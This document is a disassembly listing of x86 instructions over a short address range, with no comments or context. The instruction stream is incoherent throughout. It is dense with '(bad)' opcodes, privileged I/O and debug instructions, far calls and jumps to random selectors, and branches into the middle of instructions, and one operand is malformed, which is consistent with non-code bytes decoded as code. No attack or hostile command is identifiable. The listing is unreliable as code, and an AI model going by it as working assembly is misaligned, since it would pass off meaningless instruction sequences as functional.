  4061e8:	outs   dx,DWORD PTR ds:[esi]
  4061e9:	inc    edx
  4061ea:	sbb    al,ch
  4061ec:	jecxz  0x4061b2
  4061ee:	les    ebp,FWORD PTR [esi+esi*1]
  4061f1:	ret    
  4061f2:	les    esp,FWORD PTR cs:[ebp-0x6006fd1c]
  4061f9:	inc    ebx
  4061fa:	xor    al,0x3a
  4061fc:	mov    ecx,0x449f0dc2
  406201:	lds    esp,FWORD PTR [ecx+eiz*2]
  406204:	or     eax,0xf4c96e6d
  406209:	adc    ebx,DWORD PTR [eax]
  40620b:	dec    edx
  40620c:	data16 (bad) 
  40620e:	fmul   st(1),st
  406210:	and    al,0xa0
  406212:	in     eax,0xb1
  406214:	cmp    DWORD PTR [eax+esi*4-0x12],edi
  406218:	addr16 push cs
  40621a:	or     DWORD PTR [edx],0xffffff9f
  40621d:	fsubr  st(0),st
  40621f:	inc    edx
  406220:	cmp    eax,DWORD PTR [ebx-0x30]
  406223:	sub    DWORD PTR [ebx-0x61],esi
  406226:	outs   dx,DWORD PTR ds:[esi]
  406227:	mov    eax,0x1d46b93f
  40622c:	sbb    eax,DWORD PTR [ebx+0x792d6d80]
  406232:	(bad)
  406235:	pusha  
  406236:	sbb    DWORD PTR [ecx+0x7c20bd45],esi
  40623c:	xor    eax,0x217486ed
  406241:	(bad)  
  406242:	or     BYTE PTR ds:0x276c63ba,bh
  406248:	imul   di,si,0x29
  40624c:	adc    edi,DWORD PTR [ecx]
  40624e:	mov    ecx,0x4cbe00b6
  406253:	dec    esi
  406254:	mov    bl,0x5b
  406256:	ret    0xcfa4
  406259:	nop
  40625a:	stos   BYTE PTR es:[edi],al
  40625b:	stos   BYTE PTR es:[edi],al
  40625c:	adc    al,0xbc
  40625e:	sub    BYTE PTR [ebp+0x50],al
  406261:	pop    ebp
  406262:	ss mov al,0x14
  406265:	dec    ebp
  406266:	(bad)  
  406267:	repnz or edx,DWORD PTR [edi+0x44]
  40626b:	mov    ebp,gs
  40626d:	pop    ebp
  40626e:	adc    DWORD PTR [ecx*1+0x65f25a5f],0xfffffffc
  406276:	or     bl,BYTE PTR [eax]
  406278:	push   ss
  406279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40627a:	add    bh,BYTE PTR [ebp+0x1dd7cdf0]
  406280:	retf   0x9071
  406283:	fs jge 0x4062fe
  406286:	or     cl,cl
  406288:	call   0x78bba283
  40628d:	jno    0x40628d
  40628f:	test   DWORD PTR [edi+0x57a880c4],edx
  406295:	dec    DWORD PTR [ecx+0x67]
  406298:	push   0x86619dee
  40629d:	sbb    eax,0xcbf5b206
  4062a2:	ins    BYTE PTR es:[edi],dx
  4062a3:	push   ebx
  4062a4:	inc    ecx
  4062a5:	inc    ebp
  4062a6:	sahf   
  4062a7:	mov    edx,0xe9569898
  4062ac:	mov    edi,0xab25edbc
  4062b1:	sbb    BYTE PTR [edi],ah
  4062b3:	adc    DWORD PTR [ebx+0x50],edi
  4062b6:	je     0x4062a7
  4062b8:	addr16 mov bh,ch
  4062bb:	or     ch,BYTE PTR [ecx]
  4062bd:	ror    DWORD PTR [edx-0x19],1
  4062c0:	push   ebx
  4062c1:	jecxz  0x4062ce
  4062c3:	pop    esi
  4062c4:	mov    dh,0x26
  4062c6:	mov    ebp,ebp
  4062c8:	or     BYTE PTR [eax+0x352769b8],ah
  4062ce:	dec    ebp
  4062cf:	dec    ebp
  4062d0:	nop
  4062d1:	(bad)  
  4062d3:	lods   eax,DWORD PTR ds:[esi]
  4062d4:	pop    esp
  4062d5:	fidiv  WORD PTR [esi+0x26c75fd8]
  4062db:	push   ss
  4062dc:	loop   0x406324
  4062de:	dec    eax
  4062df:	fisubr WORD PTR [esi+0x48]
  4062e2:	out    0x45,eax
  4062e4:	call   0x899a:0x51c895ec
  4062eb:	imul   esp,DWORD PTR [edx+0x3a],0x72
  4062ef:	sub    esi,ebx
  4062f1:	daa    
  4062f2:	ds icebp 
  4062f4:	mov    eax,ds:0x882d9773
  4062f9:	das    
  4062fa:	out    dx,al
  4062fb:	retf   0x21b8
  4062fe:	jmp    0x40637f
  406300:	or     DWORD PTR [ecx+0x18],ebx
  406303:	lds    ebp,FWORD PTR [edi-0x5e]
  406306:	mov    al,0xc6
  406308:	fild   WORD PTR [eax]
  40630a:	adc    BYTE PTR [eax-0x1e],cl
  40630d:	in     eax,0xc7
  40630f:	adc    eax,0x1438752
  406314:	inc    ecx
  406315:	loope  0x40634a
  406317:	push   esp
  406318:	fbld   TBYTE PTR [esp+edi*1-0x1d]
  40631c:	shl    DWORD PTR [esi],0x33
  40631f:	fild   WORD PTR ds:0x2f2cce05
  406325:	adc    DWORD PTR [edi+eiz*8],esp
  406328:	lock mov DWORD PTR [eax+0x704499ab],edx
  40632f:	in     eax,0x44
  406331:	mov    DWORD PTR [edi],eax
  406333:	int    0xf0
  406335:	push   0xe1829343
  40633a:	fwait
  40633b:	pop    ds
  40633c:	aas    
  40633d:	dec    ecx
  40633e:	(bad)  
  40633f:	cli    
  406340:	ja     0x406351
  406342:	sbb    al,0xad
  406344:	mov    ds:0xa93bf7a2,eax
  406349:	sar    BYTE PTR [ebx],0x3e
  40634c:	mov    bl,0x8d
  40634e:	adc    dh,BYTE PTR ds:0x99600a36
  406354:	js     0x40637a
  406356:	cmp    eax,0xd18363c8
  40635b:	mov    eax,0x78090906
  406360:	xlat   BYTE PTR ds:[ebx]
  406361:	pop    ebp
  406362:	pop    ss
  406363:	aas    
  406364:	xor    ebp,DWORD PTR [ebp-0x3764163]
  40636a:	int3   
  40636b:	lods   al,BYTE PTR ds:[esi]
  40636c:	push   es
  40636d:	jb     0x406394
  40636f:	mov    ah,cl
  406371:	xchg   esp,eax
  406372:	sub    al,0x64
  406374:	sub    eax,0xd06f4b72
  406379:	dec    edx
  40637a:	add    DWORD PTR [esi+0xde62cf2],0x4
  406381:	add    ebx,ebp
  406383:	pop    esp
  406384:	dec    ecx
  406385:	popf   
  406386:	es data16 loop 0x4063b4
  40638a:	aad    0x85
  40638c:	sbb    al,0xfc
  40638e:	push   ebx
  40638f:	and    DWORD PTR ds:0x8969abaa,esi
  406395:	cmp    edx,0xffffff99
  406398:	dec    esi
  406399:	dec    ebp
  40639a:	test   eax,0x5a253dd7
  40639f:	call   0x8c9a70d3
  4063a4:	sbb    BYTE PTR [ecx+0x2e],bh
  4063a7:	sub    DWORD PTR [edi+0x32],eax
  4063aa:	jmp    0x658fcaa3
  4063af:	test   edi,ebp
  4063b1:	lock ror BYTE PTR [edi+0x2a3595fa],1
  4063b8:	shr    BYTE PTR [edi+0x37],cl
  4063bb:	xchg   esp,eax
  4063bc:	dec    ebp
  4063bd:	idiv   DWORD PTR [eax+0x3]
  4063c0:	sti    
  4063c1:	cmp    eax,0x733936f6
  4063c6:	push   esp
  4063c7:	mov    al,ds:0x1b638d78
  4063cc:	cld    
  4063cd:	std    
  4063ce:	xchg   esi,eax
  4063cf:	mov    dl,0x7d
  4063d1:	mov    bh,0x1c
  4063d3:	adc    ecx,DWORD PTR ds:0x817e961f
  4063d9:	std    
  4063da:	scas   al,BYTE PTR es:[edi]
  4063db:	pushf  
  4063dc:	fisub  WORD PTR [ebx+0x5fb65326]
  4063e2:	mov    edi,0xb30dec77
  4063e7:	data16 clc 
  4063e9:	add    DWORD PTR ds:0xbf53a56d,esp
  4063ef:	add    ebx,DWORD PTR [ecx]
  4063f1:	test   al,0x74
  4063f3:	lock hlt 
  4063f5:	dec    ebx
  4063f6:	enter  0x99b9,0x10
  4063fa:	xor    DWORD PTR [eax+0x9],eax
  4063fd:	jns    0x4063c8
  4063ff:	adc    eax,0x65782195
  406404:	mov    ebx,0xfc4c1be1
  406409:	adc    bh,BYTE PTR ds:0xa06fdf1d
  40640f:	mov    eax,0xff2a0cd2
  406414:	jae    0x40646d
  406416:	jecxz  0x406427
  406418:	ret    
  406419:	aad    0x8b
  40641b:	outs   dx,BYTE PTR ds:[esi]
  40641c:	mov    al,ds:0x26b9900a
  406421:	in     eax,dx
  406422:	rol    dh,1
  406424:	fisub  WORD PTR ds:0xaf4f7f35
  40642a:	xchg   ecx,eax
  40642b:	xor    eax,0xaf38a16e
  406430:	push   es
  406431:	or     dl,BYTE PTR [esi+0x6563cb1c]
  406437:	or     eax,0x7107f189
  40643c:	inc    eax
  40643d:	jb     0x4064b2
  40643f:	call   0x5214:0x4915b8d2
  406446:	inc    ecx
  406447:	test   BYTE PTR es:[ebx+0x697249fc],bl
  40644e:	in     al,dx
  40644f:	repz push ds
  406451:	pop    ds
  406452:	neg    BYTE PTR [eax+eiz*8+0xf]
  406456:	xor    eax,0xbb02a201
  40645b:	and    eax,ebp
  40645d:	sub    dl,BYTE PTR [ebx]
  40645f:	add    BYTE PTR [esi+0x181a15b7],ah
  406465:	sti    
  406466:	out    0x67,al
  406468:	rcr    BYTE PTR [edi+0x51],1
  40646b:	ficom  WORD PTR [edx-0x23]
  40646e:	pop    eax
  40646f:	pop    es
  406470:	cmc    
  406471:	out    0xa8,eax
  406473:	jl     0x4064ec
  406475:	mov    ecx,0x51f7a08c
  40647a:	push   ebp
  40647b:	cmp    al,0x9a
  40647d:	sbb    BYTE PTR [ebx+0x7903f95a],cl
  406483:	push   edx
  406484:	popf   
  406485:	xchg   esi,eax
  406486:	in     eax,dx
  406487:	push   ss
  406488:	pop    es
  406489:	cmp    al,0x91
  40648b:	cmp    eax,0x4c839e18
  406490:	sahf   
  406491:	lock push eax
  406493:	jne    0x406481
  406495:	or     BYTE PTR [esi+eax*2+0x7d],0xc0
  40649a:	sub    cl,BYTE PTR [esi+ebx*1]
  40649d:	out    0xdc,eax
  40649f:	mov    ebp,0x52a04352
  4064a4:	inc    edx
  4064a5:	leave  
  4064a6:	or     eax,0x36a57d5c
  4064ab:	ds (bad) 
  4064ad:	and    al,0x44
  4064af:	xor    ah,BYTE PTR [edi]
  4064b1:	xchg   esp,eax
  4064b2:	test   al,0x41
  4064b5:	mov    al,0xf
  4064b7:	fnstsw WORD PTR [esi-0x57128e05]
  4064bd:	inc    ebp
  4064be:	mov    ds:0xb9356dc5,eax
  4064c3:	jae    0x406497
  4064c5:	push   esi
  4064c6:	outs   dx,DWORD PTR ds:[esi]
  4064c7:	xor    esi,DWORD PTR [edx+0x3e4bf436]
  4064cd:	outs   dx,BYTE PTR ds:[esi]
  4064ce:	or     BYTE PTR [esi+0x12],ah
  4064d1:	fwait
  4064d2:	xor    al,0xb8
  4064d4:	xchg   bl,dl
  4064d6:	call   0x27a5:0xffe6a642
  4064dd:	mov    ebp,0xf932cae5
  4064e2:	fist   DWORD PTR [eax-0x7d911d51]
  4064e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e9:	scas   eax,DWORD PTR es:[edi]
  4064ea:	call   0xc5a1c25
  4064ef:	cmp    ebp,edx
  4064f1:	push   ss
  4064f2:	sbb    cl,BYTE PTR [ebx+0x55b0f202]
  4064f8:	imul   esp,DWORD PTR [esi+edi*2+0x30],0x7
  4064fd:	sub    DWORD PTR [ecx-0x7e],ebp
  406500:	mov    ds:0xb2d9d3b2,al
  406505:	sub    al,0x4
  406507:	sub    ebp,ebx
  406509:	mov    edi,0x98de5603
  40650e:	imul   edi,DWORD PTR [edi+0x7af3e5e0],0x20d90d88
  406518:	mov    eax,0xd7abb53
  40651d:	mov    ds:0x8492ed6a,al
  406522:	fisub  WORD PTR [ecx-0x7f50b3]
  406528:	out    0x36,eax
  40652a:	(bad)  
  40652b:	ror    BYTE PTR [edi-0x64],0xb6
  40652f:	add    al,0x21
  406531:	sub    edi,DWORD PTR [eax+0xa35d8c5]
  406537:	mov    eax,0xfe8df5ad
  40653c:	popa   
  40653d:	(bad)
  406540:	in     al,0x5
  406542:	sbb    al,0x57
  406544:	dec    ebp
  406545:	add    DWORD PTR [esi-0x23],esp
  406548:	or     esi,ebx
  40654a:	dec    ch
  40654c:	pusha  
  40654d:	(bad)  
  40654e:	mov    WORD PTR [esi+0x14],fs
  406551:	clc    
  406552:	jae    0x406595
  406554:	jg     0x406575
  406556:	mov    ds:0x763ec98c,ax
  40655c:	cdq    
  40655d:	xor    cl,BYTE PTR [edi-0x118147d3]
  406563:	int    0x2f
  406565:	inc    esi
  406566:	xchg   ebx,eax
  406567:	loopne 0x4064fc
  406569:	jo     0x40655f
  40656b:	mov    al,0x72
  40656d:	and    BYTE PTR [edx],0x66
  406570:	push   edi
  406571:	inc    edx
  406572:	rcl    BYTE PTR [edi+0x15],1
  406575:	rcl    DWORD PTR [esi],1
  406577:	out    dx,al
  406578:	sub    cl,BYTE PTR [ecx-0x62ade9cf]
  40657e:	lahf   
  40657f:	dec    edx
  406580:	nop
  406581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406582:	add    eax,0x449f0415
  406587:	mov    BYTE PTR [ebp-0x4c],dh
  40658a:	cld    
  40658b:	mul    BYTE PTR [ebp+0x70]
  40658e:	stos   DWORD PTR es:[edi],eax
  40658f:	div    BYTE PTR [ecx]
  406591:	loop   0x4065df
  406593:	lock push edi
  406595:	data16 loope 0x406540
  406598:	ror    DWORD PTR [edx+0x2b],0x8f
  40659c:	int    0x9c
  40659e:	test   al,0x76
  4065a0:	jnp    0x406596
  4065a2:	sbb    BYTE PTR [ebp-0x1c],dl
  4065a5:	add    DWORD PTR [eax-0x433bf379],ebx
  4065ab:	cmp    BYTE PTR [eax+0x57656f28],ah
  4065b1:	push   es
  4065b2:	dec    edx
  4065b3:	adc    al,cl
  4065b5:	into   
  4065b6:	in     al,dx
  4065b7:	dec    ebp
  4065b8:	mov    ch,BYTE PTR [eax]
  4065ba:	xchg   cl,ah
  4065bc:	and    DWORD PTR [edi+0xe21a44e],0x49
  4065c3:	add    eax,0xb1db4772
  4065c8:	daa    
  4065c9:	pop    edi
  4065ca:	fnstenv [edi]
  4065cc:	mov    esp,0x53f788b7
  4065d1:	addr16 xor al,0x95
  4065d4:	jnp    0x4065ee
  4065d6:	or     eax,0xf8c49511
  4065db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065dc:	mov    eax,ds:0xb5c6dc0e
  4065e1:	adc    BYTE PTR [edx-0x5b9b67f0],al
  4065e7:	and    BYTE PTR [edx],dl
  4065e9:	xchg   edx,eax
  4065ea:	imul   eax,DWORD PTR [edx+eax*4+0x53612d82],0x1b
  4065f2:	call   0xd245e1be
  4065f7:	stos   BYTE PTR es:[edi],al
  4065f8:	inc    sp
  4065fa:	pushf  
  4065fb:	shl    DWORD PTR [edx*1+0x19534e7c],cl
  406602:	sbb    BYTE PTR [edx+ebp*8-0x79d71e29],ah
  406609:	mov    ds:0x7f8756b2,al
  40660e:	inc    edi
  40660f:	popa   
  406610:	xchg   edi,eax
  406611:	or     al,0xb
  406613:	jnp    0x4065d5
  406615:	es das 
  406617:	mov    esp,0xc771d2c3
  40661c:	sub    BYTE PTR [ebp-0x74c49b8a],al
  406622:	xor    esi,DWORD PTR [ecx-0x2e]
  406625:	repz push ebp
  406627:	and    edi,edi
  406629:	fild   QWORD PTR [eax-0x3b3579c2]
  40662f:	or     eax,0x2a3606e4
  406634:	push   0x1f
  406636:	mov    dl,0xe
  406638:	inc    esi
  406639:	mov    esi,0xeda0b5b6
  40663e:	leave  
  40663f:	es aas 
  406641:	test   DWORD PTR [ebp-0x7d60bd],eax
  406647:	jno    0x406600
  406649:	cs cld 
  40664b:	shl    eax,1
  40664d:	push   eax
  40664e:	out    dx,eax
  40664f:	pop    ebx
  406650:	enter  0xb3c6,0xe5
  406654:	add    BYTE PTR [edi],0x4a
  406657:	call   0x80754bcd
  40665c:	push   esi
  40665d:	data16 out 0xb1,al
  406660:	push   ecx
  406661:	push   ds
  406662:	repz lahf 
  406664:	jmp    DWORD PTR [ecx+0x1b2011d3]
  40666a:	ficomp WORD PTR [esi+0x3fd2450a]
  406670:	bound  edi,QWORD PTR [ecx-0x123f95b6]
  406676:	cmp    BYTE PTR [edi+ebp*8-0x65],dh
  40667a:	sub    edx,eax
  40667c:	data16 add al,ah
  40667f:	add    esi,DWORD PTR ds:0x3ecf90d9
  406685:	loope  0x406629
  406687:	icebp  
  406688:	cmp    al,ch
  40668a:	test   BYTE PTR [ebx+0x69],ah
  40668d:	or     eax,0xa794f01b
  406692:	inc    esi
  406693:	shl    DWORD PTR [ecx],0x87
  406696:	jmp    0x35ae:0x89f3ac93
  40669d:	mov    eax,0xcc18d0a3
  4066a2:	and    BYTE PTR [ecx+0x54],0xd0
  4066a6:	dec    ebp
  4066a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a8:	adc    BYTE PTR [edi],ah
  4066aa:	loop   0x4066b8
  4066ac:	scas   eax,DWORD PTR es:[edi]
  4066ad:	out    0x67,al
  4066af:	inc    esi
  4066b0:	adc    bl,bh
  4066b2:	and    edi,DWORD PTR [eax-0x28]
  4066b5:	push   ebx
  4066b6:	shr    BYTE PTR [edi-0x5c79a344],1
  4066bc:	stc    
  4066bd:	mov    ah,BYTE PTR [ebx-0x6d]
  4066c0:	push   0x30
  4066c2:	push   ebp
  4066c3:	jl     0x406685
  4066c5:	lea    ecx,[ecx-0x1a]
  4066c8:	jbe    0x406689
  4066ca:	inc    ebx
  4066cb:	push   es
  4066cc:	test   ah,ch
  4066ce:	sbb    ch,al
  4066d0:	mov    ecx,ebx
  4066d2:	loopne 0x40670b
  4066d4:	xchg   esp,eax
  4066d5:	cmp    al,0x8d
  4066d7:	or     dl,ch
  4066d9:	add    DWORD PTR [edx-0x6f],edx
  4066dc:	loopne 0x4066ef
  4066de:	pop    eax
  4066df:	mov    edi,0x58704c4a
  4066e4:	inc    ecx
  4066e5:	pop    esp
  4066e6:	adc    BYTE PTR [edi],ch
  4066e8:	pop    esp
  4066e9:	hlt    
  4066ea:	ins    DWORD PTR es:[edi],dx
  4066eb:	(bad)  
  4066ec:	pop    esp
  4066ed:	in     al,dx
  4066ee:	adc    esp,DWORD PTR [ebx]
  4066f0:	mov    esi,edi
  4066f2:	sbb    ah,BYTE PTR [edx+0x7afbdc3f]
  4066f8:	test   al,0x3b
  4066fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066fc:	pop    ds
  4066fd:	(bad)  
  4066fe:	dec    ebx
  4066ff:	mov    edi,0x184b80cd
  406704:	inc    edx
  406705:	jmp    0x406698
  406707:	mov    al,0x92
  406709:	mov    al,ds:0xb06c13c
  40670e:	jb     0x4066e8
  406710:	mov    ecx,0x4c7111ff
  406715:	ins    DWORD PTR es:[edi],dx
  406716:	push   ecx
  406717:	xchg   ecx,eax
  406718:	cli    
  406719:	add    eax,0x9b5d432d
  40671e:	cwde   
  40671f:	scas   eax,DWORD PTR es:[edi]
  406720:	push   ecx
  406721:	mov    eax,ds:0x127fc542
  406726:	push   esp
  406727:	inc    edi
  406728:	cmp    al,0x86
  40672a:	icebp  
  40672b:	push   esi
  40672c:	loope  0x4067a5
  40672e:	test   DWORD PTR [ecx],esi
  406730:	mov    al,ds:0x2b7a5ce6
  406735:	arpl   WORD PTR [esi+0x39aa7b3],si
  40673b:	not    DWORD PTR [ebx-0x42]
  40673e:	cli    
  40673f:	sbb    eax,0xdb9e3701
  406744:	in     eax,dx
  406745:	faddp  st(7),st
  406747:	xor    BYTE PTR [edx+0x6f],cl
  40674a:	cdq    
  40674b:	and    BYTE PTR [ebp-0x61],dl
  40674e:	fisubr WORD PTR [esi]
  406750:	pop    ebp
  406751:	cdq    
  406752:	ret    
  406753:	mov    dh,0x8e
  406755:	pop    esi
  406756:	les    esi,FWORD PTR [eiz*4-0x2eee122d]
  40675d:	mov    eax,0x2b104b96
  406762:	xlat   BYTE PTR ds:[ebx]
  406763:	cli    
  406764:	stos   BYTE PTR es:[edi],al
  406765:	dec    esi
  406766:	cld    
  406767:	(bad)  
  406768:	xchg   ecx,eax
  406769:	test   DWORD PTR [edx],ecx
  40676b:	xchg   ebx,eax
  40676c:	cwde   
  40676d:	pop    edi
  40676e:	pop    ebx
  40676f:	mov    al,0xa4
  406771:	sub    al,0x6a
  406773:	mov    esi,0xf7e1f6ac
  406778:	data16 test BYTE PTR [edx+0x26373d0d],dl
  40677f:	outs   dx,DWORD PTR ds:[esi]
  406780:	js     0x406708
  406782:	sbb    DWORD PTR [ebx-0x212c19b6],0xf42405f0
  40678c:	lock jmp 0x9fb2:0xc690508c
  406794:	fld    QWORD PTR [eax]
  406796:	push   0x7ab14890
  40679b:	ret    0xb83
  40679e:	sub    al,0x1f
  4067a0:	push   bx
  4067a2:	js     0x40675d
  4067a4:	in     al,dx
  4067a5:	pop    eax
  4067a6:	push   ecx
  4067a7:	sub    al,0x17
  4067a9:	push   ebx
  4067aa:	pop    ds
  4067ab:	je     0x40674d
  4067ad:	xchg   esi,eax
  4067ae:	mov    DWORD PTR [ebp-0x2e100249],esp
  4067b4:	xchg   cl,dh
  4067b6:	sub    al,0x7d
  4067b8:	push   0x3f4aa0cd
  4067bd:	add    ah,BYTE PTR [eax+0x55ce1e81]
  4067c3:	pusha  
  4067c4:	lock call 0x1f8fb98e
  4067ca:	mov    cl,0xf2
  4067cc:	mov    WORD PTR [ebx+0x4],?
  4067cf:	dec    ebp
  4067d0:	sub    DWORD PTR [ebx-0x41],ecx
  4067d3:	test   eax,0x1c53d516
  4067d8:	sbb    BYTE PTR [ebx-0x2d9950b7],dh
  4067de:	or     al,0xb2
  4067e0:	aad    0x8c
  4067e2:	adc    eax,0xb5d51775
  4067e7:	dec    edx
  4067e8:	inc    ebx
  4067e9:	and    DWORD PTR [edi+0x54],esp
  4067ec:	cmp    al,0x93
  4067ee:	imul   esi,DWORD PTR [esi-0x68],0x722f38da
  4067f5:	adc    ah,dl
  4067f7:	jg     0x40683a
  4067f9:	into   
  4067fa:	cld    
  4067fb:	stc    
  4067fc:	pusha  
  4067fd:	mov    edi,0x7e7e29a6
  406802:	je     0x406835
  406804:	sbb    BYTE PTR [ebp-0x51],0xec
  406808:	inc    ebx
  406809:	arpl   WORD PTR cs:[edx-0x5c],bx
  40680d:	out    0x97,al
  40680f:	in     eax,0x9e
  406811:	gs push ebx
  406813:	ds mov eax,0xcf4df30d
  406819:	fsub   DWORD PTR [ecx-0x47]
  40681c:	inc    ebx
  40681d:	xchg   esp,eax
  40681e:	cmp    bl,BYTE PTR [esi+0x79887bb]
  406824:	xor    al,0x8d
  406826:	mov    edx,0x34802a71
  40682b:	test   BYTE PTR [edi+0x2b99731d],ah
  406831:	ins    BYTE PTR es:[edi],dx
  406832:	xchg   esp,eax
  406833:	jne    0x40689b
  406835:	pop    ebp
  406836:	sub    dh,0xfb
  406839:	test   DWORD PTR [esi],edx
  40683b:	push   cs
  40683c:	sti    
  40683d:	imul   ebx,DWORD PTR [edx+0x47e17c6],0xffffffd4
  406844:	iret   
  406845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406846:	xlat   BYTE PTR ds:[ebx]
  406847:	pop    ecx
  406848:	mov    al,ds:0xd5eaa3cc
  40684d:	test   DWORD PTR [edi],0xcb09356b
  406853:	aaa    
  406854:	adc    eax,DWORD PTR [esi]
  406856:	xchg   DWORD PTR fs:[esp+eiz*4+0x29fffcb1],ecx
  40685e:	mov    al,ds:0x2b099bc
  406863:	dec    esi
  406864:	pop    ebp
  406865:	xchg   edi,eax
  406866:	retf   
  406867:	mov    cl,0xc5
  406869:	mov    BYTE PTR [ebx-0x2c433b55],al
  40686f:	aad    0x40
  406871:	mov    cs,ebp
  406873:	lods   eax,DWORD PTR ds:[esi]
  406874:	and    BYTE PTR [ebx+0x2d00e0],0xf7
  40687b:	mov    bl,0xc2
  40687d:	sub    eax,0xeb92a7d8
  406882:	jp     0x406839
  406884:	loop   0x4068a2
  406886:	dec    edx
  406887:	arpl   WORD PTR [ebx-0xe],di
  40688a:	mov    ds:0xeef88700,eax
  40688f:	lahf   
  406890:	popa   
  406891:	ja     0x406862
  406893:	icebp  
  406894:	into   
  406895:	(bad)  
  406897:	mov    ds:0x4268d073,al
  40689c:	iret   
  40689d:	xchg   edx,eax
  40689e:	inc    eax
  40689f:	inc    esi
  4068a0:	aad    0x53
  4068a2:	fisttp WORD PTR [ebx+edx*2]
  4068a5:	aaa    
  4068a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068a7:	imul   ecx,DWORD PTR [ecx-0x6fa97569],0xffffffe4
  4068ae:	jle    0x406916
  4068b0:	xchg   dl,ch
  4068b2:	sbb    dh,ch
  4068b4:	icebp  
  4068b5:	stc    
  4068b6:	jae    0x4068cb
  4068b8:	jle    0x406899
  4068ba:	sub    ecx,DWORD PTR [eax+0x29]
  4068bd:	jns    0x406848
  4068bf:	and    al,0xbd
  4068c1:	scas   eax,DWORD PTR es:[edi]
  4068c2:	fcomip st,st(6)
  4068c4:	cdq    
  4068c5:	gs add al,0xd1
  4068c8:	or     DWORD PTR ds:0x730b5eeb,ebx
  4068ce:	xchg   DWORD PTR [edi+0x1a],esp
  4068d1:	(bad)  
  4068d2:	iret   
  4068d3:	stos   BYTE PTR es:[edi],al
  4068d4:	ret    0xb2c4
  4068d7:	sbb    ch,BYTE PTR [esi+0x3a6fd9ee]
  4068dd:	xor    eax,0xee728593
  4068e2:	and    bh,dh
  4068e4:	push   cs
  4068e5:	test   DWORD PTR [ecx+0x46],edi
  4068e8:	stos   BYTE PTR es:[edi],al
  4068e9:	push   ebp
  4068ea:	ret    
  4068eb:	sub    al,0xfb
  4068ed:	daa    
  4068ee:	(bad)  
  4068ef:	push   DWORD PTR [ebx]
  4068f1:	mov    eax,0xdfeaa045
  4068f6:	fisubr DWORD PTR [edx]
  4068f8:	idiv   BYTE PTR [edx]
  4068fa:	and    dl,dl
  4068fc:	and    eax,ebp
  4068fe:	dec    edi
  4068ff:	inc    edx
  406900:	jnp    0x4068bf
  406902:	push   esi
  406903:	std    
  406904:	in     al,0x87
  406906:	cs ja  0x4068ef
  406909:	dec    edi
  40690a:	sub    esp,ecx
  40690c:	call   DWORD PTR [edx]
  40690e:	mov    esp,0xe050a49b
  406913:	cli    
  406914:	js     0x40691e
  406916:	jo     0x4068a9
  406918:	leave  
  406919:	add    DWORD PTR [eax-0x74],ecx
  40691c:	mov    edx,0x2db6f75e
  406921:	rol    DWORD PTR ds:0x52bd0672,cl
  406927:	sahf   
  406928:	xor    DWORD PTR [ecx-0x9],esi
  40692b:	xor    al,BYTE PTR [edx+0x2f]
  40692e:	adc    DWORD PTR fs:[edx],eax
  406931:	and    dh,BYTE PTR ds:0xc61559da
  406937:	fsub   QWORD PTR [ebp+0x4fea1c7]
  40693d:	popf   
  40693e:	pop    es
  40693f:	scas   eax,DWORD PTR es:[edi]
  406940:	or     eax,0xdfdc9cc9
  406945:	clc    
  406946:	jnp    0x4068dd
  406948:	out    dx,eax
  406949:	pop    ebp
  40694a:	or     DWORD PTR [edi-0x55fc8338],0xffffffc9
  406951:	paddusb mm3,QWORD PTR [esi+0x41ffc31b]
  406958:	sbb    ebx,edi
  40695a:	imul   esi,DWORD PTR [ebp+edi*4+0x6b32d1f3],0x91c31cb3
  406965:	icebp  
  406966:	lea    esi,[edi-0x10]
  406969:	pop    ecx
  40696a:	popf   
  40696b:	popa   
  40696c:	daa    
  40696d:	and    BYTE PTR [edi+0x5f],dl
  406970:	into   
  406971:	xor    ah,cl
  406973:	cs push cs
  406975:	loop   0x406902
  406977:	inc    eax
  406978:	jne    0x4069bd
  40697a:	mov    eax,ds:0xc076ceb7
  40697f:	adc    DWORD PTR [ebx],ecx
  406981:	dec    ecx
  406982:	add    ecx,DWORD PTR [ecx+0x5a52679c]
  406988:	push   eax
  406989:	in     al,dx
  40698a:	ss mov dl,0x46
  40698d:	or     ch,cl
  40698f:	push   ecx
  406990:	pop    ss
  406991:	loop   0x40699f
  406993:	or     edi,DWORD PTR [esi+0x15]
  406996:	int3   
  406997:	ret    0x50b2
  40699a:	aam    0x9d
  40699c:	les    eax,FWORD PTR [edi-0x41]
  40699f:	and    BYTE PTR [ecx],bl
  4069a1:	mov    bl,0x42
  4069a3:	cmp    ecx,DWORD PTR [edi]
  4069a5:	scas   al,BYTE PTR es:[edi]
  4069a6:	cmc    
  4069a7:	loopne 0x4069eb
  4069a9:	and    BYTE PTR [edx+eiz*8+0x40],0xd1
  4069ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069af:	fsub   QWORD PTR [esi+0x5ed69666]
  4069b5:	and    al,0xc
  4069b7:	mov    bl,0x93
  4069b9:	add    ebx,eax
  4069bb:	popa   
  4069bc:	mov    dh,0x90
  4069be:	add    al,BYTE PTR [edi-0x46]
  4069c1:	pusha  
  4069c2:	xor    BYTE PTR [edi+0x4c1bc12],cl
  4069c8:	stc    
  4069c9:	cmp    al,0x4b
  4069cb:	jae    0x406991
  4069cd:	(bad)  
  4069ce:	dec    ebp
  4069cf:	dec    edx
  4069d0:	mov    esi,0x6141799a
  4069d5:	push   ds
  4069d6:	add    bl,BYTE PTR [ebx+0x55bc7328]
  4069dc:	dec    esi
  4069dd:	or     esi,DWORD PTR [ecx+0x41c1633a]
  4069e3:	(bad)  
  4069e4:	clc    
  4069e5:	not    BYTE PTR [edi+0x24]
  4069e8:	(bad)  
  4069e9:	cmp    bl,BYTE PTR [edi+ebp*4-0x6b81ea6e]
  4069f0:	or     BYTE PTR [ebx+eiz*4-0x73654d5e],0xee
  4069f8:	call   FWORD PTR [ebx]
  4069fa:	mov    al,ds:0x5388bdd5
  4069ff:	xchg   ebp,eax
  406a00:	ficomp DWORD PTR [ecx-0x31]
  406a03:	mov    gs,WORD PTR [eax+ecx*4-0x4efc938e]
  406a0a:	mov    dh,0x10
  406a0d:	sub    ecx,DWORD PTR [bx-0x17]
